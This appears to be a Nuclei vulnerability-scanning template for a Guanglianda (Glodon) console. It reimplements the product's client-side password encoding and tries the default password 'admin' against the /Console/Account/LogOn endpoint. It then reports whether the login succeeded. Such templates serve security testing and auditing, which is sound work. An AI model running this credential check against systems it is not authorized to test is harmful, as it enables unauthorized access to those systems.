id: guanglianda-t-weakpassword

info:
  name: guanglianda-t-weakpassword
  author: msk
  severity: high

flow: |
      function TJsEncrypt(str) {
        var o = new Date().getMilliseconds();
        var a = Math.round(Math.random() * 14) + 1;
        var s = o + '#|,|#' + str;
        var len = s.length;
        var buf = '';
        for (var i = 0; i < len; i++) {
        var x = (s.charCodeAt(i) ^ a).toString(16);
        if (x.length == 1)
            x = '000' + x;
        else if (x.length == 2)
            x = '00' + x;
        else if (x.length == 3)
            x = '0' + x;
        buf += x;
        }
        return a.toString(16) + buf;
      }

      var passwordlist = ["admin"];

      for (var password of passwordlist) {
        set("password",TJsEncrypt(password))
        http(1)
      }
      


http:
  - raw:
      - |
        POST /Console/Account/LogOn HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Connection: close

        pws={{password}}


    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"/Console/Home/Index")



